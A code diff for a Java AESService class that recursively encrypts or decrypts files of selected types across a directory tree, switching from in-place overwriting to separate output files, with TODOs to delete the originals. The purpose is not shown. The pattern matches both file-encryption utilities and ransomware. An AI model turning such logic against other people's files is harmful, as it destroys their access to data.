@@ -61,14 +61,14 @@ public class AESService {
     // TODO : Add javadocs
     private static void encryptFiles(File directory, List<FileType> fileTypes, SecretKey key, IvParameterSpec iv) {
         // Get files matching file types to encrypt
-        List<File> filesToEncrypt = FileUtils.getFiles(directory, fileTypes);
+        List<File> filesToEncrypt = FileUtils.getFiles(directory, fileTypes, false);
 
         // Encrypt each file
         for (File file : filesToEncrypt) {
-            byte[] bytes = FileUtils.toBytes(file);
-            byte[] encryptedBytes = CipherUtils.encrypt(bytes, key, iv);
-            FileUtils.overwriteFile(file, encryptedBytes);
+            CipherUtils.encrypt(file, key, iv);
         }
+
+        // TODO : Delete original files
 
         // Get subdirectory in directory
         List<File> subdirectories = FileUtils.getSubdirectories(directory);
@@ -111,14 +111,14 @@ public class AESService {
     // TODO : Add javadocs
     private static void decryptFiles(File directory, List<FileType> fileTypes, SecretKey key, IvParameterSpec iv) {
         // Get files matching file types to decrypt
-        List<File> filesToDecrypt = FileUtils.getFiles(directory, fileTypes);
+        List<File> filesToDecrypt = FileUtils.getFiles(directory, fileTypes, true);
 
         // Decrypt each file
         for (File file : filesToDecrypt) {
-            byte[] bytes = FileUtils.toBytes(file);
-            byte[] originalBytes = CipherUtils.decrypt(bytes, key, iv);
-            FileUtils.overwriteFile(file, originalBytes);
+            CipherUtils.decrypt(file, key, iv);
         }
+
+        // TODO : Delete encrypted files
 
         // Get subdirectory in directory
         List<File> subdirectories = FileUtils.getSubdirectories(directory);
